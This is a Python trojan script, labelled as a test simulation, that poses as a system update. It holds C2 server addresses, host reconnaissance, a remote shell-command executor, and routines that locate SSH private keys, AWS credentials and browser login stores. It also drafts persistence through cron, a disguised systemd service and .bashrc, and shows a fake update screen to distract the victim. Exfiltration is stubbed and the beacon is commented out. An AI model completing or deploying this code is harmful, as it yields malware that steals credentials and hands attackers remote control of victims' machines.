#!/usr/bin/env python3
"""
Trojan Horse - Fake System Update
TEST SIMULATION ONLY - DO NOT EXECUTE
"""

import os
import sys
import socket
import subprocess
import base64
import json
import threading
import time
from pathlib import Path

# C2 Server configuration
C2_SERVERS = [
    "185.234.72.84:4444",
    "91.121.87.18:8080", 
    "command.darkweb.onion:443"
]

BEACON_INTERVAL = 300  # 5 minutes

class TrojanClient:
    def __init__(self):
        self.victim_id = self._generate_id()
        self.c2_socket = None
        self.running = True
        
    def _generate_id(self):
        """Generate unique victim identifier"""
        hostname = socket.gethostname()
        username = os.getenv('USER', 'unknown')
        return base64.b64encode(f"{hostname}:{username}".encode()).decode()
    
    def _collect_system_info(self):
        """Gather system reconnaissance data"""
        info = {
            "hostname": socket.gethostname(),
            "username": os.getenv('USER'),
            "home": str(Path.home()),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
            "platform": sys.platform,
        }
        
        # Get network interfaces
        try:
            info["ip"] = socket.gethostbyname(socket.gethostname())
        except:
            info["ip"] = "unknown"
            
        # List running processes
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            info["processes"] = result.stdout[:2000]
        except:
            pass
            
        return info
    
    def _exfiltrate_data(self, data):
        """Send stolen data to C2"""
        encoded = base64.b64encode(json.dumps(data).encode())
        # Would send to C2 server
        pass
    
    def _execute_command(self, cmd):
        """Execute received command from C2"""
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except Exception as e:
            return {"error": str(e)}
    
    def _steal_credentials(self):
        """Attempt to steal stored credentials"""
        creds = []
        
        # Browser credentials
        chrome_path = Path.home() / ".config/google-chrome/Default/Login Data"
        firefox_path = Path.home() / ".mozilla/firefox"
        
        # SSH keys
        ssh_path = Path.home() / ".ssh"
        if ssh_path.exists():
            for key_file in ssh_path.glob("id_*"):
                if not key_file.name.endswith('.pub'):
                    creds.append({"type": "ssh_key", "path": str(key_file)})
        
        # AWS credentials
        aws_creds = Path.home() / ".aws/credentials"
        if aws_creds.exists():
            creds.append({"type": "aws", "path": str(aws_creds)})
            
        return creds
    
    def _establish_persistence(self):
        """Create persistence mechanisms"""
        # Cron job
        cron_entry = f"@reboot python3 {__file__}"
        
        # Systemd service
        service_content = f"""
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {__file__}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        
        # Bashrc modification
        bashrc_entry = f"python3 {__file__} &>/dev/null &"
        
    def beacon(self):
        """Main C2 beacon loop"""
        while self.running:
            try:
                # Collect and send system info
                info = self._collect_system_info()
                self._exfiltrate_data(info)
                
                # Check for commands
                # Would receive commands from C2
                
                time.sleep(BEACON_INTERVAL)
            except:
                time.sleep(60)

def show_fake_update():
    """Display fake update dialog to user"""
    print("=" * 50)
    print("  CRITICAL SYSTEM UPDATE REQUIRED")
    print("=" * 50)
    print("\nYour system requires an important security update.")
    print("Please wait while the update is being installed...")
    print("\n[████████████████████████████] 100%")
    print("\nUpdate completed successfully!")
    
if __name__ == "__main__":
    # Show fake update to distract user
    show_fake_update()
    
    # Start trojan in background
    # trojan = TrojanClient()
    # trojan.beacon()
